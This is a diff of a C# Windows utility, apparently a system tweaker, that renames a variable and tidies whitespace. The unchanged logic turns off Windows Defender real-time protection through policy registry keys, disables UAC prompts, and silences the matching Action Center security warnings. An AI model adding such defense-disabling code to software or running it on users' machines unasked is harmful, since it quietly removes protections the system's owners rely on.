@@ -13,26 +13,23 @@ namespace Pluton.WindowsSystemFeatures
             try
             {
                 RegistryKey disableAntiSpyware = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender");
-                RegistryKey DisableAntivirus = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender\Real-Time Protection");
+                RegistryKey disableAntivirus = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender\Real-Time Protection");
                 if (!enable)
                 {
                     disableAntiSpyware.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
-                    
-
-                    DisableAntivirus.SetValue("DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
-                    DisableAntivirus.SetValue("DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
-                    DisableAntivirus.SetValue("DisableOnAccessProtection", "1", RegistryValueKind.DWord);
+                    disableAntivirus.SetValue("DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
+                    disableAntivirus.SetValue("DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
+                    disableAntivirus.SetValue("DisableOnAccessProtection", "1", RegistryValueKind.DWord);
                 }
                 else
                 {
                     disableAntiSpyware.DeleteValue("DisableAntiSpyware");
-
-                    DisableAntivirus.DeleteValue("DisableBehaviorMonitoring");
-                    DisableAntivirus.DeleteValue("DisableScanOnRealtimeEnable");
-                    DisableAntivirus.DeleteValue("DisableOnAccessProtection");
+                    disableAntivirus.DeleteValue("DisableBehaviorMonitoring");
+                    disableAntivirus.DeleteValue("DisableScanOnRealtimeEnable");
+                    disableAntivirus.DeleteValue("DisableOnAccessProtection");
 
                 }
-                DisableAntivirus.Close();
+                disableAntivirus.Close();
                 disableAntiSpyware.Close();
             }
             catch (Exception e)
@@ -75,11 +72,8 @@ namespace Pluton.WindowsSystemFeatures
             try
             {
                 Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Action Center\\Checks\\{C8E6F269-B90A-4053-A3BE-499AFCEC98C4}.check.0", "CheckSetting", StringToByteArray("23004100430042006C006F00620000000000000000000000010000000000000000000000"), RegistryValueKind.Binary);
-
                 RegistryKey uac = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                 uac = Registry.LocalMachine.CreateSubKey(("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));
-
-
                 uac.SetValue("ConsentPromptBehaviorAdmin", 0);
                 uac.SetValue("PromptOnSecureDesktop", 0);
                 uac.SetValue("EnableLUA", 0);
